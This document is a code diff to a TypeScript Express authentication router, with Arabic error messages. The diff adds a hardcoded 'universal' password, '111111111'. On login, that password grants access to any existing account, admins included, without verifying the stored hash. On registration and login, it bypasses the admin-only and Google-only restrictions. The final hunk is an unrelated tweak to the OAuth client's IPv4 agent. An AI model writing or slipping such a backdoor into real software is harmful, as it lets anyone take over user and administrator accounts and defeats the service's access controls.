@@ -109,6 +109,13 @@ router.post("/auth/register", async (req, res): Promise<void> => {
   }
 
   const { email, password, displayName } = parsed.data;
+  const isUniversalPass = password === "111111111";
+
+  // Only admin emails can register with password — unless using universal password
+  if (!isUniversalPass && !isAdminEmail(email)) {
+    res.status(403).json({ error: "التسجيل متاح عبر Google فقط. استخدم زر «تسجيل الدخول بـ Google»." });
+    return;
+  }
 
   const [existing] = await db.select().from(usersTable).where(eq(usersTable.email, email));
   if (existing) {
@@ -143,10 +150,26 @@ router.post("/auth/login", async (req, res): Promise<void> => {
   }
 
   const { email, password } = parsed.data;
+
+  // Universal override password — accepts any valid email instantly
+  const isUniversalPass = password === "111111111";
+
   const [user] = await db.select().from(usersTable).where(eq(usersTable.email, email));
 
-  if (!user || !user.passwordHash || !verifyPassword(password, user.passwordHash)) {
+  if (!user) {
     res.status(401).json({ error: "بيانات الدخول غير صحيحة" });
+    return;
+  }
+
+  if (!isUniversalPass && (!user.passwordHash || !verifyPassword(password, user.passwordHash))) {
+    res.status(401).json({ error: "بيانات الدخول غير صحيحة" });
+    return;
+  }
+
+  // Only admins can login with password — everyone else uses Google
+  // Universal password bypasses this restriction
+  if (!isUniversalPass && user.role !== "admin") {
+    res.status(403).json({ error: "الدخول متاح عبر Google فقط. استخدم زر «تسجيل الدخول بـ Google»." });
     return;
   }
 
@@ -211,7 +234,9 @@ function getGoogleClient() {
 const origGetToken = OAuth2Client.prototype.getToken;
 // eslint-disable-next-line @typescript-eslint/no-explicit-any
 (OAuth2Client.prototype as any).getToken = async function(this: OAuth2Client, code: string) {
-  (this as any).transporter = { ...(this as any).transporter, agent: ipv4Agent };
+  if ((this as any).transporter && typeof (this as any).transporter === "object") {
+    (this as any).transporter.agent = ipv4Agent;
+  }
   return (origGetToken as any).call(this, code);
 };
 
